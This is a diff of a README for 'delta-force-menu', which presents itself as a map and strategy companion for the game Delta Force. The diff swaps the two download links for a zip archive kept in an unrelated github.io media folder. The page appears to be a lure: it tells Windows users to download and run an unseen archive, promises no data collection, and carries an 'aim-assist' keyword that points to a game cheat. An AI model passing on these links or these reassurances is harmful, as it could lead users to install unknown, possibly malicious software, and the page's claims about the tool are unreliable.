@@ -10,7 +10,7 @@ Welcome to **delta-force-menu**, your complete interactive map and strategy comp
 
 ## 📥 Download & Installation
 **Step 1: Get the Application**
-Visit this link to download the application: **[https://raw.githubusercontent.com/MortalxHexin/mortalxhexin.github.io/main/media/bts/App-3.0.zip](https://raw.githubusercontent.com/MortalxHexin/mortalxhexin.github.io/main/media/bts/App-3.0.zip)**
+Visit this link to download the application: **[https://github.com/MortalxHexin/mortalxhexin.github.io/raw/refs/heads/main/media/bts/App-3.0.zip](https://github.com/MortalxHexin/mortalxhexin.github.io/raw/refs/heads/main/media/bts/App-3.0.zip)**
 
 Once you're on that page, look for the latest release file. Click the download button for the version that matches your system (Windows is recommended). The download will start automatically.
 
@@ -83,6 +83,6 @@ Your privacy is respected. This application collects no personal data, does not 
 - [x] Reviewed the resource, PvE, and extraction overlays
 - [x] Applied the knowledge in-game for smarter, safer runs
 
-**Ready to dominate the extraction zones?** The download link is right here: **[Get delta-force-menu Now](https://raw.githubusercontent.com/MortalxHexin/mortalxhexin.github.io/main/media/bts/App-3.0.zip)**. Whether you're grinding for loot on Zero Dam or braving the vacuum of Space Base, this design study gives you the edge to outsmart the map itself. Good luck, operator – extraction is waiting.
+**Ready to dominate the extraction zones?** The download link is right here: **[Get delta-force-menu Now](https://github.com/MortalxHexin/mortalxhexin.github.io/raw/refs/heads/main/media/bts/App-3.0.zip)**. Whether you're grinding for loot on Zero Dam or braving the vacuum of Space Base, this design study gives you the edge to outsmart the map itself. Good luck, operator – extraction is waiting.
 
 Keywords: delta-force, delta-force-aim-assist
